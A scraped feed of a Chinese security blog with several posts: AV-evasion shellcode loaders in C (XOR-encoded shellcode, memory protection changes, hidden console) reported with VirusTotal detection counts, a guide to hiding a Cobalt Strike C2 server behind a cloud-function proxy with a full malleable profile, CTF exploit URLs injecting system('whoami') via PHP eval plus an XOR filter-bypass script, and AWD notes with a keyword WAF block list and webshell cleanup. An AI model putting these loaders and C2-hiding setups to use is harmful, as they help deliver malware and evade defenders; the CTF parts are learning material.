&amp;dwOldProtect); Sleep(2000); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束 return 0;&#125; 免杀效果 8/66b07db5b474a3e42e444299f28a71e6fd8d5cf808d91d2680e4bece8d4bd89fc4 简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)#pragma comment(linker, &quot;/INCREMENTAL:NO&quot;)#pragma comment(linker, &quot;/section:.data,RWE&quot;)// 入口函数int main(int argc, TCHAR* argv[]) &#123; int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄 DWORD dwOldProtect; unsigned char buf[] = &quot;\\xed\\x59\\x92\\xf5\\xe1\\xf9\\xd9\\x11\\x11\\x11\\x50\\x40\\x50\\x41\\x43\\x40\\x47\\x59\\x20\\xc3\\x74\\x59\\x9a\\x43\\x71\\x59\\x9a\\x43\\x09\\x59\\x9a\\x43\\x31\\x59\\x9a\\x63\\x41\\x59\\x1e\\xa6\\x5b\\x5b\\x5c\\x20\\xd8\\x59\\x20\\xd1\\xbd\\x2d\\x70\\x6d\\x13\\x3d\\x31\\x50\\xd0\\xd8\\x1c\\x50\\x10\\xd0\\xf3\\xfc\\x43\\x50\\x40\\x59\\x9a\\x43\\x31\\x9a\\x53\\x2d\\x59\\x10\\xc1\\x77\\x90\\x69\\x09\\x1a\\x13\\x64\\x63\\x9a\\x91\\x99\\x11\\x11\\x11\\x59\\x94\\xd1\\x65\\x76\\x59\\x10\\xc1\\x41\\x9a\\x59\\x09\\x55\\x9a\\x51\\x31\\x58\\x10\\xc1\\xf2\\x47\\x59\\xee\\xd8\\x50\\x9a\\x25\\x99\\x59\\x10\\xc7\\x5c\\x20\\xd8\\x59\\x20\\xd1\\xbd\\x50\\xd0\\xd8\\x1c\\x50\\x10\\xd0\\x29\\xf1\\x64\\xe0\\x5d\\x12\\x5d\\x35\\x19\\x54\\x28\\xc0\\x64\\xc9\\x49\\x55\\x9a\\x51\\x35\\x58\\x10\\xc1\\x77\\x50\\x9a\\x1d\\x59\\x55\\x9a\\x51\\x0d\\x58\\x10\\xc1\\x50\\x9a\\x15\\x99\\x59\\x10\\xc1\\x50\\x49\\x50\\x49\\x4f\\x48\\x4b\\x50\\x49\\x50\\x48\\x50\\x4b\\x59\\x92\\xfd\\x31\\x50\\x43\\xee\\xf1\\x49\\x50\\x48\\x4b\\x59\\x9a\\x03\\xf8\\x5e\\xee\\xee\\xee\\x4c\\x7b\\x11\\x58\\xaf\\x66\\x78\\x7f\\x78\\x7f\\x74\\x65\\x11\\x50\\x47\\x58\\x98\\xf7\\x5d\\x98\\xe0\\x50\\xab\\x5d\\x66\\x37\\x16\\xee\\xc4\\x59\\x20\\xd8\\x59\\x20\\xc3\\x5c\\x20\\xd1\\x5c\\x20\\xd8\\x50\\x41\\x50\\x41\\x50\\xab\\x2b\\x47\\x68\\xb6\\xee\\xc4\\xfa\\x62\\x4b\\x59\\x98\\xd0\\x50\\xa9\\x41\\x11\\x11\\x11\\x5c\\x20\\xd8\\x50\\x40\\x50\\x40\\x7b\\x12\\x50\\x40\\x50\\xab\\x46\\x98\\x8e\\xd7\\xee\\xc4\\xfa\\x48\\x4a\\x59\\x98\\xd0\\x59\\x20\\xc3\\x58\\x98\\xc9\\x5c\\x20\\xd8\\x43\\x79\\x11\\x13\\x51\\x95\\x43\\x43\\x50\\xab\\xfa\\x44\\x3f\\x2a\\xee\\xc4\\x59\\x98\\xd7\\x59\\x92\\xd2\\x41\\x7b\\x1b\\x4e\\x59\\x98\\xe0\\x59\\x98\\xcb\\x58\\xd6\\xd1\\xee\\xee\\xee\\xee\\x5c\\x20\\xd8\\x43\\x43\\x50\\xab\\x3c\\x17\\x09\\x6a\\xee\\xc4\\x94\\xd1\\x1e\\x94\\x8c\\x10\\x11\\x11\\x59\\xee\\xde\\x1e\\x95\\x9d\\x10\\x11\\x11\\xfa\\xc2\\xf8\\xf5\\x10\\x11\\x11\\xf9\\xb3\\xee\\xee\\xee\\x3e\\x5e\\x78\\x53\\x72\\x11\\x2a\\xab\\x16\\xdb\\x1f\\x60\\x28\\x5c\\xe5\\x62\\xb1\\x74\\x71\\xad\\x51\\x34\\xb1\\x06\\x40\\xa2\\xdd\\xf4\\x68\\x3e\\xea\\x31\\x08\\xb9\\x0b\\x49\\x69\\x75\\x5f\\xe6\\x03\\xfe\\x0c\\x1f\\xfd\\xf0\\xe4\\x74\\x06\\xd4\\x3e\\xf6\\x93\\xaa\\x4f\\x88\\xb2\\x41\\x9a\\x35\\x9a\\x8d\\xe7\\x05\\xfa\\x92\\x5c\\x94\\x14\\x94\\x99\\xe2\\x1d\\x90\\xa0\\x7b\\x4b\\x6c\\x6a\\x11\\x44\\x62\\x74\\x63\\x3c\\x50\\x76\\x74\\x7f\\x65\\x2b\\x31\\x5c\\x7e\\x6b\\x78\\x7d\\x7d\\x70\\x3e\\x25\\x3f\\x21\\x31\\x39\\x72\\x7e\\x7c\\x61\\x70\\x65\\x78\\x73\\x7d\\x74\\x2a\\x31\\x5c\\x42\\x58\\x54\\x31\\x29\\x3f\\x21\\x2a\\x31\\x46\\x78\\x7f\\x75\\x7e\\x66\\x62\\x31\\x5f\\x45\\x31\\x27\\x3f\\x20\\x2a\\x31\\x46\\x5e\\x46\\x27\\x25\\x2a\\x31\\x45\\x63\\x78\\x75\\x74\\x7f\\x65\\x3e\\x25\\x3f\\x21\\x2a\\x31\\x42\\x5d\\x52\\x52\\x23\\x2a\\x31\\x3f\\x5f\\x54\\x45\\x31\\x52\\x5d\\x43\\x31\\x23\\x3f\\x21\\x3f\\x24\\x21\\x26\\x23\\x26\\x38\\x1c\\x1b\\x11\\x78\\x8a\\xf1\\x6f\\xa3\\xa7\\x29\\x7b\\xad\\x72\\x4f\\xe8\\x94\\x8d\\x33\\x75\\x06\\x51\\x4b\\x26\\x67\\xf1\\x71\\x15\\x45\\xe2\\x7b\\x74\\x1a\\x7f\\x0f\\x81\\x96\\xa8\\xfa\\xe8\\x94\\x1a\\x33\\xc6\\x75\\x51\\x6d\\x67\\x45\\xc7\\x36\\x6d\\x09\\x3d\\x86\\x56\\x4c\\x1d\\x42\\x9f\\xd9\\xfd\\xdd\\x11\\xcf\\xec\\xf9\\x76\\x91\\xaa\\xf4\\xd7\\x70\\x05\\x02\\x2d\\x30\\x5f\\x17\\xe8\\xc8\\x30\\xb6\\x8c\\x5f\\x72\\xd9\\x2a\\xbf\\x7f\\xe3\\xf2\\x49\\x38\\x05\\x8b\\xa0\\xfd\\xcc\\xd7\\xf5\\x73\\xc1\\x30\\x6d\\xf5\\xde\\x30\\x40\\xec\\x07\\x6e\\xdc\\xef\\x79\\xcd\\xcb\\x06\\x0d\\xe6\\xba\\x24\\x68\\x54\\x20\\x06\\xe0\\x21\\xec\\xcc\\x5e\\xec\\x24\\xde\\x85\\xbb\\xac\\xda\\x02\\x59\\xc2\\xb4\\x3e\\xa9\\x89\\xfc\\x74\\x45\\x09\\x24\\xa3\\x2d\\x32\\x0a\\x9c\\xa5\\x1c\\x73\\xde\\xf0\\x8a\\x6a\\xf6\\x72\\x3b\\x97\\x9c\\x07\\xf5\\xcb\\xea\\xb5\\x12\\x5a\\x9f\\x0f\\x12\\x12\\xb2\\x5c\\x00\\x0c\\x3b\\xaa\\xd8\\xf0\\xae\\xa1\\xb4\\x32\\x1c\\xc7\\x7c\\x25\\x88\\x11\\x50\\xaf\\xe1\\xa4\\xb3\\x47\\xee\\xc4\\x59\\x20\\xd8\\xab\\x11\\x11\\x51\\x11\\x50\\xa9\\x11\\x01\\x11\\x11\\x50\\xa8\\x51\\x11\\x11\\x11\\x50\\xab\\x49\\xb5\\x42\\xf4\\xee\\xc4\\x59\\x82\\x42\\x42\\x59\\x98\\xf6\\x59\\x98\\xe0\\x59\\x98\\xcb\\x50\\xa9\\x11\\x31\\x11\\x11\\x58\\x98\\xe8\\x50\\xab\\x03\\x87\\x98\\xf3\\xee\\xc4\\x59\\x92\\xd5\\x31\\x94\\xd1\\x65\\xa7\\x77\\x9a\\x16\\x59\\x10\\xd2\\x94\\xd1\\x64\\xc6\\x49\\x49\\x49\\x59\\x14\\x11\\x11\\x11\\x11\\x41\\xd2\\xf9\\x8e\\xec\\xee\\xee\\x20\\x28\\x23\\x3f\\x20\\x27\\x29\\x3f\\x23\\x25\\x29\\x3f\\x20\\x11\\x40\\x18\\xae\\x7c\\x11&quot;; // 获取shellcode大小 shellcode_size = sizeof(buf); /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ //shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存 for (int i = 0; i &lt; shellcode_size; i++) &#123; buf[i] = buf[i] ^ 17; &#125; char* shellcode = (char*)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_READWRITE ); // 将shellcode复制到可执行的内存页中 CopyMemory(shellcode, buf, shellcode_size); VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect); Sleep(2000); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束 return 0;&#125; 免杀效果VT 7/64 a7a87509ad387960dedd08a609db3fe3c935cefc52b8ae97f5b761b1ac6ff7d3 更新记录本次更新于2021.12.2，静态免杀效果VT 7/64，期末了，要准备期末考试，还要看论文，只能每天抽点时间去学相关知识。 todo：远程加载shellcode 更高级的shellcode混淆方法（对称加密） ctf 隐写shellcode？","categories":[],"tags":[{"name":"免杀","slug":"免杀","permalink":"https://polosec.github.io/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"一道简单的flask-web题","slug":"一道简单的flask-web题","date":"2021-11-25T07:36:34.000Z","updated":"2021-11-25T07:41:06.000Z","comments":true,"path":"2021/11/25/一道简单的flask-web题/","link":"","permalink":"https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/","excerpt":"","text":"PKU的一道简单flask web题 感觉挺有意思的代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import osimport jsonfrom shutil import copyfilefrom flask import Flask,request,render_template,url_for,send_from_directory,make_response,redirectfrom werkzeug.middleware.proxy_fix import ProxyFixfrom flask import jsonifyfrom hashlib import md5import signalfrom http.server import HTTPServer, SimpleHTTPRequestHandleros.environ[&#x27;TEMP&#x27;]=&#x27;/dev/shm&#x27;app = Flask(&quot;access&quot;)app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1 ,x_proto=1)@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): if request.method == &#x27;POST&#x27;: f=request.files[&#x27;file&#x27;] os.system(&quot;rm -rf /dev/shm/zip/media/*&quot;) path=os.path.join(&quot;/dev/shm/zip/media&quot;,&#x27;tmp.zip&#x27;)# 拼接文件路径 f.save(path) os.system(&#x27;timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/&#x27;) os.system(&#x27;rm /dev/shm/zip/media/tmp.zip&#x27;) return redirect(&#x27;/media/&#x27;) response = render_template(&#x27;index.html&#x27;) return response@app.route(&#x27;/media/&#x27;,methods=[&#x27;GET&#x27;])@app.route(&#x27;/media&#x27;,methods=[&#x27;GET&#x27;])@app.route(&#x27;/media/&lt;path&gt;&#x27;,methods=[&#x27;GET&#x27;])def media(path=&quot;&quot;): npath=os.path.join(&quot;/dev/shm/zip/media&quot;,path) if not os.path.exists(npath): return make_response(&quot;404&quot;,404) if not os.path.isdir(npath): f=open(npath,&#x27;rb&#x27;) response = make_response(f.read()) response.headers[&#x27;Content-Type&#x27;] = &#x27;application/octet-stream&#x27; return response else: fn=os.listdir(npath) fn=[&quot;..&quot;]+fn f=open(&quot;templates/template.html&quot;) x=f.read() f.close() ret=&quot;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot; for i in fn: tpath=os.path.join(&#x27;/media/&#x27;,path,i) ret+=&quot;&lt;a href=&#x27;&quot;+tpath+&quot;&#x27;&gt;&quot;+i+&quot;&lt;/a&gt;&lt;br&gt;&quot; x=x.replace(&quot;HTMLTEXT&quot;,ret) return xos.system(&#x27;mkdir /dev/shm/zip&#x27;)os.system(&#x27;mkdir /dev/shm/zip/media&#x27;)app.run(host=&quot;0.0.0.0&quot;,port=8080,debug=False,threaded=True) 大意为用户上传一个zip压缩包，服务器端解压后显示压缩包内的内容并且可以下载类似这样。 我们可以利用Linux的软链接实现文件读取下面制作一个存在软连接的zip压缩包 zip flag.zip flag –symlinks 直接下载文件得到读取的flag文件 flag{NeV3r_trUSt_Any_C0mprEsSEd_File}","categories":[],"tags":[],"author":"Polo"},{"title":"广东省强网杯运维赛部分WP","slug":"广东省强网杯运维赛部分WP","date":"2021-11-15T12:45:56.000Z","updated":"2021-11-15T13:41:17.000Z","comments":true,"path":"2021/11/15/广东省强网杯运维赛部分WP/","link":"","permalink":"https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/","excerpt":"","text":"上周末打了强网杯，某赛道打了第三名拿了二等奖，上午是运维赛，下午是awd。上午的运维赛出的还可以，我觉得难度相对低一点，一共12道题，到最后基本有一半的人能做出来6-8道左右，本赛道第三-八名全部是8道题。这次拿奖得亏了有pwn👴去修题，我web应急响应做的不如别人多。 吐槽：下午的AWD纯脑瘫，参赛手册写的是AWDP，赛制介绍则是AWD。不一致也就算了，下午AWD只给一道巨难的pwn是什么意思？最后放hint连exp都快放完了，最后只有高校组有1-2支队伍在打，其他赛道全在罚坐。 web运维反序列化有一个存在反序列化漏洞的页面，大体意思就是传入参数之后反序列化进行命令执行，题目本身给了waf，只不过关键词比较少。如 blacklist=’\\php|flag|system|&#39;;自己加一些关键字就好了 12345678$pattern = &quot;\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\\:\\/\\/|file\\:\\/\\/|fread|create\\_function|php|script|\\&lt;\\?php|\\&#x27;|\\&quot;|\\(|\\)|\\&amp;&quot;;$back_list = explode(&quot;|&quot;,$pattern);foreach($back_list as $hack) &#123; if(preg_match(&quot;/$hack/i&quot;, $query)) // 假设用户输入的参数是 $query die(&quot;hack detected!&quot;);&#125; 多加了几个关键字这题的check就过了 不死马 ls -all 看了一下有.2.php，我直接 rm -rf 删完之后这个check点还是没有过，之后又ll看了下发现是不死马。 杀不死马有2种思路，第一种是写脚本无限循环删除，python或者shell或者php脚本都可以，第二种是重启php-fpm服务。这次给的权限比较高，是root，可以直接重启。但是在大部分awd比赛中可能没有重启服务的权限，所以第一种思路是必行的。 附脚本 12345 while :do rm -rf .3.php; echo &quot;remove success&quot;;done上传上去之后chmod u+x 1.sh 然后 nohup ./1.sh &amp;挂着跑就可以了。 phpinfo信息泄露没啥好说的，删了就行。 后门把源码搞下来放到D盾查杀，查到了后门，直接删掉就好，还有XXE，文件也是直接删掉就好。 应急响应挖矿web就那么几道题我是妹想到的，我以为后面还会放题，专门问了主办方，主办方说一次放完，好吧，那估计是要在其他地方找patch点了。top看了一下，有一个进程的cpu利用率过高，在/home/ctf/mxxx目录下（具体目录名称记不清了）是一个elf文件，同目录下还有json的配置文件，直觉告诉我是挖矿。挖矿程序常在tmp目录写点东西，这里的操作就是首先干掉挖矿进程，然后删掉挖矿程序以及tmp目录下对应的内容，然后查看crontab防止再次下载与自启动。 crontabcrontab这题我应该是妹做出来，异常点是ctf用户的crontab，我是root用户。看了 /var/spool/cron/crontabs没看到啥东西,就没在看。赛后师傅说了下 crontab -user -l 也可以看指定用户的crontab。。学到了 外连socketnetstat -antlp 之后发现有向9999端口外连的行为，然后ps aux 和ps ef 之后看到了命令类似 sh -c python3 -c “__import__(‘os’).system(‘xxxxxx’)”。可以确定是这些进程建立了socket连接，但是找不到具体是谁起了这些进程…就很无奈，杀也杀不掉，这里我的处理方法是把python3的软连接给干掉了。因为通过观察进程发现除了这些外连的没有用py3起的进程。这里其实是有个so文件被修改了，后面pwn的队友修复的。 ssh公钥ssh 免密登录存放的公钥在~/.ssh/authorized_keys文件里面，由于我们是私钥登录，但是里面有三个公钥，我们只保留了我们私钥对应的公钥，其他公钥全给删了。 总结这次运维赛相对基础，就当温习一下应急响应了。毕竟只正经做过一次：）","categories":[],"tags":[],"author":"Polo"},{"title":"两道简单ctf-php-web题","slug":"两道简单ctf-web题","date":"2021-11-05T16:26:30.000Z","updated":"2021-11-05T16:32:23.000Z","comments":true,"path":"2021/11/06/两道简单ctf-web题/","link":"","permalink":"https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334&lt;?phphighlight_file(&#x27;index.php&#x27;);extract($_GET);error_reporting(0);function String2Array($data)&#123; if($data == &#x27;&#x27;) return array(); @eval(&quot;\\$array = $data;&quot;); return $array;&#125;if(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123; $attrstr .= &#x27;array(&#x27;; $attrids = count($attrid); for($i=0; $i&lt;$attrids; $i++) &#123; $attrstr .= &#x27;&quot;&#x27;.intval($attrid[$i]).&#x27;&quot;=&gt;&#x27;.&#x27;&quot;&#x27;.$attrvalue[$i].&#x27;&quot;&#x27;; if($i &lt; $attrids-1) &#123; $attrstr .= &#x27;,&#x27;; &#125; &#125; $attrstr .= &#x27;);&#x27;;&#125;String2Array($attrstr);​```注意点：extract可以进行变量覆盖，eval那句话是把字符串数组格式转为真正的数组。exp: http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo(); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#96;&#96;&#96;php&lt;?phperror_reporting(&#39;0&#39;);$str1 &#x3D; $_GET[&#39;str1&#39;];$str2 &#x3D; $_GET[&#39;str2&#39;];function waf($str)&#123; $blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;; if (preg_match($blacklist,$str)) &#123; return false; &#125; return true;&#125;function HackMe($str1,$str2)&#123;$str &#x3D; &quot;&quot;;for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)&#123;$array1[$i] &#x3D; $str1[$i];&#125;for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)&#123;$array2[$b] &#x3D; $str2[$b];&#125;for ($c&#x3D;0;$c &lt;count($array1);$c++)&#123;$str &#x3D; $str.($array1[$c] ^ $array2[$c]);&#125;if (strlen($str)&lt;&#x3D;30)&#123;if (waf($str))&#123;echo $str;eval($str);&#125;else&#123;echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;&#125;&#125;else&#123;echo &quot;nonono you are sooooooooo lang~&quot;;&#125;&#125;HackMe($str1,$str2);?&gt; 题目复现时没有waf.php，在比赛的时候需要去fuzz下过滤了哪个字符，所以我这里简单写了些waf的实现，直接写到function里面了。简单的异或，脚本如下 123456789101112131415161718192021222324ava_alpha=[]for i in range(0,128): if(32&lt;i and i&lt;127): ava_alpha.append(chr(i))target_str=&quot;system(&#x27;whoami&#x27;);&quot;res1=&quot;&quot;res2=&quot;&quot;blacklist=[&#x27;!&#x27;]class Getoutofloop(Exception): passfor k in range (len(target_str)): try: for i in ava_alpha: for j in ava_alpha: if(chr(ord(i)^ord(j))==(target_str[k]) and i not in blacklist and j not in blacklist): res1+=str(i) res2+=str(j) raise Getoutofloop() except: passprint(res1)print(res2) 比较简单的异或，写脚本的时候注意如何跳出所有循环，这里用到了raise exception，可以根据黑名单维护blacklist保证不用blacklist里面的字符生成异或字符。","categories":[],"tags":[],"author":"Polo"},{"title":"CobaltStrike 云函数隐藏服务器IP","slug":"CobaltStrike-云函数隐藏服务器IP","date":"2021-10-15T09:46:15.000Z","updated":"2021-10-15T11:14:32.000Z","comments":true,"path":"2021/10/15/CobaltStrike-云函数隐藏服务器IP/","link":"","permalink":"https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/","excerpt":"","text":"参考链接https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q https://blog.zsec.uk/cobalt-strike-profiles/ 前言在红队基础设施建设中，使用云函数可隐藏真实C2的IP地址，当然，这只是其中一种方法，其他方法包括但不限于特征消除、证书修改、CDN、域前置。这些技术会陆续实现。 准备工作腾讯云注册云函数 新建函数-自定义创建函数 Python模板，python3.6即可，触发方式选择API网关触发 在函数代码中写入如下代码 123456789101112131415161718192021# -*- coding: utf8 -*-import json,requests,base64def main_handler(event, context): C2=&#x27;http://&#x27; # C2 IP地址，这里可以使用 HTTP、HTTPS~下角标~ path=event[&#x27;path&#x27;] headers=event[&#x27;headers&#x27;] print(event) if event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; : resp=requests.get(C2+path,headers=headers,verify=False) else: resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False) print(resp.headers) print(resp.content) response=&#123; &quot;isBase64Encoded&quot;: True, &quot;statusCode&quot;: resp.status_code, &quot;headers&quot;: dict(resp.headers), &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1] &#125; return response 接下来配置API网关 版本选择LATEST，点进去蓝色的链接进行API配置，路径改为根目录 然后下一步，事件函数，版本选择LATEST，一定要勾选响应集成。之后点立即完成就可以了。 发布服务之后在右边可以看到API的HTTP与HTTPS地址，记住这个有用，当然了，在云函数那也可以看（函数服务-触发管理-访问路径） cobalt strike配置CS的配置踩大坑。 首先是编写对应的profile，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859set sample_name &quot;t&quot;;set sleeptime &quot;3000&quot;;set jitter &quot;0&quot;;set maxdns &quot;255&quot;;set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;http-get &#123; set uri &quot;/api/x&quot;; client &#123; header &quot;Accept&quot; &quot;*/*&quot;; metadata &#123; base64; prepend &quot;SESSIONID=&quot;; header &quot;Cookie&quot;; &#125; &#125; server &#123; header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;; header &quot;content-transfer-encoding&quot; &quot;binary&quot;; header &quot;Server&quot; &quot;Nodejs&quot;; output &#123; base64; print; &#125; &#125;&#125;http-stager &#123; set uri_x86 &quot;/vue.min.js&quot;; set uri_x64 &quot;/bootstrap-2.min.js&quot;;&#125;http-post &#123; set uri &quot;/api/y&quot;; client &#123; header &quot;Accept&quot; &quot;*/*&quot;; id &#123; base64; prepend &quot;JSESSION=&quot;; header &quot;Cookie&quot;; &#125; output &#123; base64; print; &#125; &#125; server &#123; header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;; header &quot;content-transfer-encoding&quot; &quot;binary&quot;; header &quot;Connection&quot; &quot;keep-alive&quot;; output &#123; base64; print; &#125; &#125;&#125; 编写完之后命名为c2.profile，然后用cs目录下的c2lint.sh进行检查，这个东西的作用就是检查编写的profile是否正确。 c2lint.sh ./c2.profile 这样看是没啥问题，然后运行teamserver的时候后面跟上profile就可以了，例如 ./teamserver.sh 1.1.1.1 123456 c2.profile 这样就可以把profile作为listener的配置。 启动cs后，添加http listener，HOSTS和STAGER填写如下 都是生成的云函数的地址，注意把前面的HTTP：//去掉！！ 保存后，生成EXE，上线。 然后在victim主机上查看流量，并没有发现C2的IP地址,140开头的地址不是我的地址。 这样就使用云函数实现了C2真实IP的隐藏，在CS中也可以正常使用命令，证明beacon工作无异常。","categories":[],"tags":[{"name":"红队技能","slug":"红队技能","permalink":"https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"}]},{"title":"绿城杯AWD总结","slug":"绿城杯AWD总结","date":"2021-10-14T17:07:20.000Z","updated":"2021-10-14T17:13:11.000Z","comments":true,"path":"2021/10/15/绿城杯AWD总结/","link":"","permalink":"https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/","excerpt":"","text":"前言这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF/AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY上午不禁止去厕所，下午AWD却禁止去厕所，谁AWD还有空去PY？消息通知混乱，到了郑州才知道要做核酸，获奖队伍少，奖金少，无现金，只有E卡。我愿称之为全国最穷国家网络安全宣传周活动。下面说我在比赛中返的一些错误。上午CTF，本人菜，没啥好说的。 致命AWD流程环节出现严重问题。赛前演练四个人的配合中都没有演练到文件监控脚本的使用，导致被别人种了不死马掉大分。在监控不到流量、pwn题下线、web一直被打的情况下当时没有想到不死马这个事情，是我疏忽了。上了文件监控脚本后再也没失分。（自动删除不死马及任何新上传的文件，无crontab，这里需要注意的是，比赛的时候我忘记crontab路径了，只能看当前user，但shell的权限大部分是www-data需要加强记忆） 严重脚本编写能力过差。当队友通过流量抓取到漏洞利用方式时，经我验证后应该迅速写出批量利用脚本，在这个地方卡住了，导致写脚本写的比较慢，应该是丢掉了许多分数。 无法自动提交flag。安恒的HTTPS流量不知道为啥抓不到，没有办法用脚本自动提交flag。 无法进一步利用已知漏洞种植不死马。这导致丢了很多分数 赛时脚本结构混乱，应将功能点分开，RCE利用和种马应同时尝试进行，利用马getflag的操作应该在另一个文件中。多线程尚未熟练掌握 AOIAWD赛前未成功部署，仅靠watchbird总是感觉力不从心。 轻微赛时紧张，对待队友的态度有时过激。 改进1.提高脚本编写能力，掌握多线程，优化脚本结构 2.在AWD演练中尝试使用RCE漏洞种植不死马并getflag。 3.本地部署AOIAWD 4.crontab路径熟记，防止有人写crontab。 5.模拟时严格演练流程，优化分工。 6.应正确对待队友，克制自己的情绪。 总结这次我有点拉跨，不过队友的表现很好，能各司其职的负责我所分配的认为（流量、赛题监控、备份与恢复、杀毒、流量告警等）我认为我的队友第一次打线下AWD能做到这种程度比我强太多了。下次AWD一定拿下！","categories":[],"tags":[]},{"title":"Traffic analysis in Lvcheng Cup","slug":"Traffic-analysis-in-Lvcheng-Cup","date":"2021-10-09T02:59:51.000Z","updated":"2021-10-09T07:43:36.000Z","comments":true,"path":"2021/10/09/Traffic-analysis-in-Lvcheng-Cup/","link":"","permalink":"https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/","excerpt":"","text":"IntroductionTarget: FIND THE FLAG(hint : AntSwort traffic) Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis. AntSword and Laravel RCE Traffic AnalysisThere are many packets in the pcap file,personally I’’ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command. node1Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I haven’t find secret.zip,so keep following packets. node1 endIn a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character. Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didn’t find any passwords,after fix ,check and broute tools I still can’t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,it’s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked. In node 1 we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation. 